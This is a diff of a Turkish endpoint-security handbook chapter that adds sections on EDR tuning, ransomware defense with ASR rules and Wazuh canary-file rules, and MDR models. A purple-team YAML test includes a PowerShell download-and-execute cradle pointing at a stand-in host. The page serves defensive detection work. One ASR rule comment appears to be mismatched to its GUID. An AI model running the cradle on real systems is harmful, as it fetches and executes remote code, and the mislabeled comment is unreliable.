@@ -9,10 +9,49 @@ sidebar:
 
 Savunma derinliği (Defense in Depth) mimarisinde uç nokta katmanı, modern tehdit modelinde fiilen ilk temas noktasıdır. Phishing ile bir iş istasyonunda makro çalıştırıldığı veya bir geliştiricinin dizüstü bilgisayarında tedarik zinciri saldırısı tetiklendiği anda çevre kontrollerinin tamamı atlanmış olur. CrowdStrike 2026 Global Threat Report, 2025 tespitlerinin **%82'sinin dosyasız** olduğunu ve saldırganların giderek geçerli kimlik bilgileri ile güvenilir kimlik akışlarını kullandığını belirtmektedir. Bu eğilim, imza tabanlı antivirüsten davranışsal telemetri toplayan EDR/XDR mimarisine geçişi zorunlu kılmaktadır.
 
-Bu bölümde Windows ve Linux sıkılaştırma, yama yönetimi, uygulama beyaz listeleme, EPP → EDR → XDR evrimi ve bellek koruma mekanizmaları; **MITRE ATT&CK** teknik kimlikleri, **NIST SP 800-53**, **CIS Controls v8**, **ISO 27001:2022** ve Türkiye mevzuatı (**KVKK**, **5651**, **BDDK BSEBY**, **CBDDO BİG Rehberi**) çerçevesinde ele alınacaktır.
+Bu bölümde Windows ve Linux sıkılaştırma, yama yönetimi, uygulama beyaz listeleme, EPP → EDR → XDR evrimi, bellek koruma mekanizmaları, **EDR tuning**, **ransomware savunması** ve **MDR** operasyon modeli; **MITRE ATT&CK** teknik kimlikleri, **NIST SP 800-53**, **CIS Controls v8**, **ISO 27001:2022** ve Türkiye mevzuatı (**KVKK**, **5651**, **BDDK BSEBY**, **CBDDO BİG Rehberi**) çerçevesinde ele alınır.
 
 ![Savunma derinliği ve uç nokta koruma katmanları](./infographic-overview.webp)
 *Uç nokta katmanında EPP, EDR ve XDR bileşenlerinin savunma derinliği içindeki konumu*
+
+```mermaid
+flowchart TB
+    subgraph Endpoint["Uç Nokta Katmanı"]
+        EPP[EPP / Antivirus]
+        EDR[EDR Agent]
+        HARD[OS Hardening GPO/Intune]
+    end
+    subgraph Platform["Merkezi Platform"]
+        XDR[XDR / SIEM]
+        MDR[MDR SOC]
+    end
+    subgraph Response["Yanıt"]
+        SOAR[SOAR Playbook]
+        AR[Active Response]
+    end
+    HARD --> EDR
+    EPP --> EDR
+    EDR -->|telemetri| XDR
+    XDR --> MDR
+    MDR --> SOAR
+    SOAR --> AR
+```
+
+<details>
+<summary>🖥️ Windows Sıkılaştırma GPO Hızlı Referansı</summary>
+
+| GPO Kategorisi | Politika | Önerilen değer |
+| :---- | :---- | :---- |
+| UAC | Elevation prompt (standard user) | Automatically deny |
+| Credential UI | Require trusted path | Enabled |
+| Enumeration | Enumerate local users on domain | Disabled |
+| LAPS | Password length / age | 30+ karakter / 30 gün |
+| BitLocker | TPM + startup PIN | Enabled |
+| ASR | Block Office child process | Enabled |
+
+**Tier modeli:** Tier 0 (DC/PKI) → Tier 1 (sunucu) → Tier 2 (iş istasyonu) OU ayrımı zorunlu.
+
+</details>
 
 ---
 
@@ -365,7 +404,222 @@ Wazuh lisans maliyeti sıfır ancak ölçeklendirme (500+ EPS, çok-node cluster
 
 ---
 
-## §7.1.8. Türkiye Mevzuatı ve Uyum Eşlemesi
+## §7.1.8. EDR Tuning ve False Positive Yönetimi
+
+EDR dağıtımının en kritik operasyonel aşaması **tuning** (ayarlama) sürecidir. Agresif politika, meşru iş süreçlerini engelleyerek alarm yorgunluğu yaratır; gevşek politika ise gerçek tehditleri kaçırır. NIST SP 800-53 **SI-4** (System Monitoring) ve CIS Controls v8 **Control 13.2** (Deploy a Host-Based IDS), EDR'ın yalnızca kurulması değil sürekli optimize edilmesini gerektirir.
+
+### Tuning Yaşam Döngüsü
+
+| Faz | Süre | Eylemler | Çıktı |
+| :---- | :---- | :---- | :---- |
+| **1. Audit Mode** | 2–4 hafta | Tüm kurallar izleme modunda; engelleme kapalı | Baseline telemetri |
+| **2. Envanter** | 1 hafta | Meşru uygulama, script, admin araçları listesi | Allowlist taslağı |
+| **3. Whitelist** | 2 hafta | False positive kaynaklarına istisna | FP oranı <%5 hedef |
+| **4. Enforcement** | Kademeli | Kritik kurallar önce block; düşük risk izleme | Üretim politikası |
+| **5. Sürekli İyileştirme** | Aylık | Purple team, yeni yazılım, yama sonrası gözden geçirme | Tuning raporu |
+
+### False Positive Azaltma Stratejileri
+
+**1. Parent-Child İlişkisi Filtreleme:** `services.exe → svchost.exe` meşru; `winword.exe → powershell.exe -enc` anormal. EDR kurallarında parent process allowlist tanımlanmalıdır.
+
+**2. Yol ve Publisher Bazlı İstisnalar:** Kurumsal uygulamaların kurulum dizinleri (`C:\Program Files\CorpApp\`) ve imzalayan sertifika thumbprint'leri allowlist'e eklenir. Hash bazlı istisna yerine **publisher** tercih edilir; yama sonrası hash değişse bile kural geçerliliğini korur.
+
+**3. Davranış Skoru Eşikleri:** Tek bir düşük güvenilirlik göstergesi alarm üretmemeli; çoklu sinyal birleşimi (ör. LSASS erişimi + network outbound + yeni oturum) yüksek skorlu olay tetiklemelidir.
+
+**4. Exclusion Scope Daraltma:** Global exclusion yerine OU/hostname/tag bazlı kısıtlı istisna uygulanır. Geliştirici makineleri ile finans iş istasyonları aynı EDR politikasına tabi olmamalıdır.
+
+```powershell
+# Microsoft Defender for Endpoint — örnek exclusion (dar kapsam)
+Add-MpPreference -ExclusionPath "C:\CorpApp\BuildAgent\bin"
+Add-MpPreference -ExclusionProcess "CorpBuildTool.exe"
+# DİKKAT: Geniş exclusion (C:\Users\) asla uygulanmamalı
+```
+
+### Tuning Metrikleri ve SLA
+
+| Metrik | Hedef | Ölçüm Yöntemi |
+| :---- | :---- | :---- |
+| False Positive Oranı | < %5 (kritik kurallar) | SOC ticket analizi |
+| Mean Time to Detect (MTTD) | < 15 dk (Tier-0) | SIEM incident timestamp |
+| Mean Time to Respond (MTTR) | < 1 saat (izolasyon) | SOAR playbook süresi |
+| MITRE Kapsama | > %80 (kritik teknikler) | ATT&CK coverage matrix |
+| Agent Sağlığı | > %99 filo | EDR console health dashboard |
+
+:::caution
+EDR tuning sırasında saldırganların istismar ettiği yolları (PowerShell, WMI, certutil) allowlist'e eklemek yaygın bir hatadır. İstisna her zaman **süreç + yol + kullanıcı + parent** dörtlüsüyle sınırlandırılmalıdır. Tüm exclusion değişiklikleri SIEM'de **T1562.001** (Disable or Modify Tools) benzeri denetim kuralıyla izlenmelidir.
+:::
+
+### Purple Team ile Doğrulama
+
+Atomic Red Team veya MITRE ATT&CK Evaluations senaryoları, tuning sonrası tespit kapsamını doğrular:
+
+```yaml
+# Atomic Red Team — T1059.001 PowerShell testi
+attack_technique: T1059.001
+executor:
+  name: powershell
+  command: |
+    IEX (New-Object Net.WebClient).DownloadString('http://test.local/payload.ps1')
+expected_detection:
+  - EventID: 4104
+  - EDR_alert: "Suspicious PowerShell"
+  - action: block_or_alert
+```
+
+Her başarısız tespit, tuning backlog'una eklenir; her false positive, allowlist gözden geçirmesine girer.
+
+---
+
+## §7.1.9. Uç Nokta Ransomware Savunması
+
+Fidye yazılımı, uç nokta katmanında **T1486** (Data Encrypted for Impact) ve **T1490** (Inhibit System Recovery) teknikleriyle gerçekleşir. §5.4'teki immutable yedekleme katmanı son çare hattıdır; uç noktada saldırıyı erken aşamada durdurmak operasyonel maliyeti dramatik biçimde düşürür.
+
+### Ransomware Saldırı Zinciri ve Savunma Noktaları
+
+```
+[Initial Access: T1566 Phishing / T1190 Exploit]
+        │
+        ▼
+[Execution: T1059 PowerShell / T1204 User Execution]
+        │  ← ASR kuralları, WDAC, AMSI
+        ▼
+[Discovery: T1083 File Discovery / T1018 Remote System Discovery]
+        │  ← EDR davranışsal tespit
+        ▼
+[Lateral Movement: T1021 SMB/RDP]
+        │  ← LAPS, tiered admin, micro-segmentation
+        ▼
+[Impact Prep: T1490 VSS/shadow delete / backup stop]
+        │  ← Sysmon T1490 kuralları, EDR block
+        ▼
+[Impact: T1486 Mass encryption]
+        │  ← EDR ransomware protection, canary files
+        ▼
+[Extortion: RaaS portal / double extortion]
+```
+
+### Katmanlı Ransomware Kontrolleri
+
+| Katman | Kontrol | MITRE Karşılık | Araç |
+| :---- | :---- | :---- | :---- |
+| **Önleme** | ASR: Office makro engelleme | T1204.002 | Defender ASR |
+| **Önleme** | WDAC/AppLocker allowlist | T1218 LOLBAS | Code Integrity |
+| **Tespit** | VSS/shadow copy silme izleme | T1490 | Sysmon + Wazuh |
+| **Tespit** | Yüksek hızlı dosya şifreleme | T1486 | EDR ML/behavioral |
+| **Müdahale** | Otomatik host izolasyonu | — | EDR/SOAR |
+| **Kurtarma** | Ransomware rollback (snapshot) | T1486 | SentinelOne vb. |
+| **Kurtarma** | Immutable yedek restore | T1490 | §5.4 mimarisi |
+
+### Microsoft Defender Ransomware Koruması
+
+```powershell
+# ASR kuralları — ransomware önleme profili
+Add-MpPreference -AttackSurfaceReductionRules_Ids 75668C1F-73B1-4CF0-BF93-3D7F0B6E9C45 -AttackSurfaceReductionRules_Actions Enabled
+# Block Office makrolarının Win32 API çağrısı yapması
+
+Add-MpPreference -AttackSurfaceReductionRules_Ids D4F940AB-401B-4EFC-AADC-AD5F3C50688A -AttackSurfaceReductionRules_Actions Enabled
+# Block Office uygulamalarının child process oluşturması
+
+Add-MpPreference -AttackSurfaceReductionRules_Ids 92E97FA1-2EDF-4476-BDD6-6DD0E4EABE8A -AttackSurfaceReductionRules_Actions Enabled
+# Block Win32 API calls from Office macros
+```
+
+### Canary Dosya ve Erken Uyarı
+
+Kritik dizinlere (ör. `C:\Users\Public\Documents\`) bilinçli olarak **canary dosyalar** yerleştirilir. Ransomware bu dosyaları şifrelemeye başladığında EDR veya FIM (Wazuh) anında alarm üretir — toplu şifreleme başlamadan önce müdahale penceresi açılır.
+
+```xml
+<!-- Wazuh FIM — canary dosya izleme -->
+<syscheck>
+  <directories realtime="yes" report_changes="yes">C:\CanaryFiles</directories>
+</syscheck>
+```
+
+**Wazuh özel kural:**
+
+```xml
+<rule id="100550" level="15">
+  <if_sid>550</if_sid>
+  <field name="file">(?i)canary</field>
+  <description>CRITICAL: Ransomware canary dosyasi degistirildi — T1486</description>
+  <mitre><id>T1486</id></mitre>
+</rule>
+```
+
+### BDDK ve KVKK Perspektifi
+
+**BDDK** siber olay bildirimi ve 24 saat süreklilik gereksinimleri, ransomware senaryosunda uç nokta tespit hızını doğrudan etkiler. **KVKK Madde 12(5)** kapsamında kişisel veri şifrelenmişse veri ihlali bildirimi gerekir; erken tespit ve izolasyon, etkilenen kayıt sayısını minimize ederek bildirim kapsamını daraltır.
+
+---
+
+## §7.1.10. MDR (Managed Detection and Response)
+
+Kurumların önemli bir kısmı 7/24 SOC kapasitesine, yeterli analist sayısına veya tehdit avcılığı (threat hunting) yetkinliğine sahip değildir. **MDR (Managed Detection and Response)**, EDR/XDR telemetrisini üçüncü taraf veya MSSP (Managed Security Service Provider) üzerinden 7/24 izleyen, olayları triyaj eden ve müdahale eden hizmet modelidir.
+
+### MDR vs MSSP vs SOC-as-a-Service
+
+| Model | Kapsam | Kurum Sorumluluğu | Tipik SLA |
+| :---- | :---- | :---- | :---- |
+| **MSSP (geleneksel)** | Log toplama + temel alarm | Olay müdahale kuruma ait | 8×5 veya 24×7 NOC |
+| **MDR** | EDR telemetri + tehdit avcılığı + müdahale | Strateji ve onay | 24×7, MTTD <30 dk |
+| **SOC-as-a-Service** | SIEM + EDR + ağ + bulut korelasyonu | Tam yönetimli veya hibrit | 24×7, tiered response |
+| **Dahili SOC** | Tüm katmanlar kurum içi | Tam sorumluluk | Kuruma özel |
+
+### MDR Hizmet Bileşenleri
+
+1. **Telemetri Toplama:** EDR agent, Sysmon, Windows Event Forwarding, ağ flow
+2. **Tehdit İstihbaratı:** STIX/TAXII feed, MISP, vendor threat graph
+3. **Korelasyon ve Triyaj:** Analyst tiering (L1/L2/L3), false positive filtreleme
+4. **Müdahale (Response):** Host izolasyonu, süreç sonlandırma, dosya karantina, credential reset
+5. **Raporlama:** Aylık tehdit raporu, MITRE kapsama, KVKK/BDDK uyum kanıtı
+
+### MDR Seçim Kriterleri
+
+| Kriter | Değerlendirme Soruları | Referans |
+| :---- | :---- | :---- |
+| **MITRE ATT&CK kapsama** | Hangi teknikler tespit ediliyor? Evaluations sonucu? | MITRE Evaluations |
+| **Yanıt yetkisi** | Otomatik izolasyon var mı? Onay süreci? | SLA dokümanı |
+| **Veri yerleşimi** | Telemetri Türkiye/yurt içi mi? KVKK uyumu? | KVKK m.9 aktarım |
+| **Entegrasyon** | Mevcut SIEM/SOAR ile API entegrasyonu? | Teknik POC |
+| **Şeffaflık** | Ham telemetriye erişim? Kural tuning yetkisi? | Sözleşme maddesi |
+| **Olay müdahale** | IR retainer dahil mi? Forensics desteği? | NIST SP 800-61 |
+
+### Hibrit MDR Mimarisi
+
+Çoğu Fortune 500 kurumu **hibrit model** tercih eder: Tier-0/Tier-1 varlıklar dahili SOC; geniş filo ve uzak şubeler MDR sağlayıcısı üzerinden izlenir.
+
+```
+┌─────────────────────────────────────────────────────────────┐
+│                    KURUMSAL SOC (Dahili)                     │
+│  Tier-0: AD, PKI, Core Banking │ SIEM + SOAR + Playbook   │
+├─────────────────────────────────────────────────────────────┤
+│                    MDR SAĞLAYICI (MSSP)                      │
+│  Geniş filo (10.000+ endpoint) │ 24×7 triyaj + izolasyon  │
+│  Threat hunting (haftalık)    │ IOC geri besleme → MISP  │
+├─────────────────────────────────────────────────────────────┤
+│                    ORTAK PLATFORM                            │
+│  EDR Console │ SIEM (Wazuh/Splunk) │ TheHive/MISP │ SOAR   │
+└─────────────────────────────────────────────────────────────┘
+```
+
+:::note
+**BDDK** finans kuruluşları için KSOME kurulumunu zorunlu kılar; MDR hizmeti KSOME'nin yerine geçmez, ancak 7/24 izleme kapasitesini tamamlar. Sözleşmede veri işleme sözleşmesi (DPA), KVKK aydınlatma yükümlülüğü ve olay bildirim SLA'ları açıkça tanımlanmalıdır.
+:::
+
+### MDR Olay Müdahale Akışı
+
+| Adım | MDR Aksiyonu | Kurum Aksiyonu | Süre |
+| :---- | :---- | :---- | :---- |
+| 1. Tespit | EDR yüksek skorlu alarm | — | 0–5 dk |
+| 2. Triyaj | L1 analist doğrulama | Bilgilendirme (P3/P2) | 5–15 dk |
+| 3. Kontrol | Host izolasyonu (otomatik/onaylı) | Onay (Tier-0 için) | 15–30 dk |
+| 4. Analiz | L2/L3 kök neden, IOC çıkarımı | IR ekibi devreye | 30 dk–4 saat |
+| 5. Temizlik | Karantina, persistence silme | Eradication onayı | 4–24 saat |
+| 6. Rapor | Olay raporu + MITRE haritası | KVKK/BDDK bildirim değerlendirmesi | 24–72 saat |
+
+---
+
+## §7.1.11. Türkiye Mevzuatı ve Uyum Eşlemesi
 
 | Kontrol | KVKK | CBDDO BİGR | BDDK BSEBY | CIS v8 | NIST 800-53 |
 | :---- | :---- | :---- | :---- | :---- | :---- |
@@ -387,11 +641,17 @@ Uç nokta güvenliği artık pasif "son hat" değil, telemetrinin doğduğu ve s
 
 1. **Önleme → Tespit → Müdahale kademelemesi:** Önce EPP/sıkılaştırma (GPO, LAPS, BitLocker, WDAC) ile yüzeyi daralt; sonra EDR ekle; korele edilecek katmanlar olduğunda XDR'a geç. Pilot ring'de 30 gün audit modu temiz çıktığında enforcement'a geç.
 
-2. **Davranışsal telemetri zorunluluğu:** Polimorfik ve dosyasız tehditler karşısında imza tek başına yetersizdir. Sysmon + PowerShell Script Block Logging (4104) + EDR davranışsal kuralları minimum tabandır.
+2. **EDR tuning sürekli süreçtir:** Dağıtım sonrası false positive yönetimi, publisher bazlı allowlist ve purple team doğrulaması olmadan EDR yatırımı tam kapasiteye ulaşamaz. FP oranı %5 altında tutulmalıdır.
 
-3. **Mevzuat-mimari hizalaması:** Log saklama süreleri (5651, BDDK 5 yıl), 72 saatlik KVKK bildirimi ve CBDDO merkezi log gereksinimleri mimari tasarım girdisi olarak en baştan ele alınmalıdır.
+3. **Ransomware çok katmanlı savunma gerektirir:** ASR kuralları, canary dosyalar, T1490/T1486 SIEM kuralları ve §5.4 immutable yedekleme birlikte uygulanmalıdır. Uç noktada erken tespit, ödeme yapmadan kurtarma şansını artırır.
 
-4. **Red Team doğrulama:** Atomic Red Team ile tespit kurallarını doğrula; MITRE ATT&CK kapsama ölçümü yap.
+4. **MDR kapasite boşluğunu kapatır:** 7/24 SOC yetkinliği olmayan kurumlar için MDR hibrit model (dahili Tier-0 + MSSP geniş filo) önerilir. KVKK veri işleme sözleşmesi ve MITRE kapsama değerlendirmesi seçim kriteridir.
+
+5. **Davranışsal telemetri zorunluluğu:** Polimorfik ve dosyasız tehditler karşısında imza tek başına yetersizdir. Sysmon + PowerShell Script Block Logging (4104) + EDR davranışsal kuralları minimum tabandır.
+
+6. **Mevzuat-mimari hizalaması:** Log saklama süreleri (5651, BDDK 5 yıl), 72 saatlik KVKK bildirimi ve CBDDO merkezi log gereksinimleri mimari tasarım girdisi olarak en baştan ele alınmalıdır.
+
+7. **Red Team doğrulama:** Atomic Red Team ile tespit kurallarını doğrula; MITRE ATT&CK kapsama ölçümü yap.
 
 **Uygulama kontrol listesi:**
 
@@ -401,5 +661,8 @@ Uç nokta güvenliği artık pasif "son hat" değil, telemetrinin doğduğu ve s
 - [ ] Linux sysctl + SELinux/AppArmor enforcing + SCA
 - [ ] Merkezi yama yönetimi + EPSS/KEV önceliklendirme
 - [ ] EDR/XDR pilot + SIEM entegrasyonu + SOC playbook güncellemesi
+- [ ] EDR tuning: audit mode → whitelist → enforcement (FP <%5)
+- [ ] Ransomware: ASR + canary dosya + T1490/T1486 SIEM kuralları
+- [ ] MDR değerlendirmesi: hibrit SOC modeli veya MSSP POC
 - [ ] Bellek koruma + ASR kuralları + behavioral detection tuning
 - [ ] 5651/KVKK/BDDK log bütünlüğü ve saklama sürelerine uyum
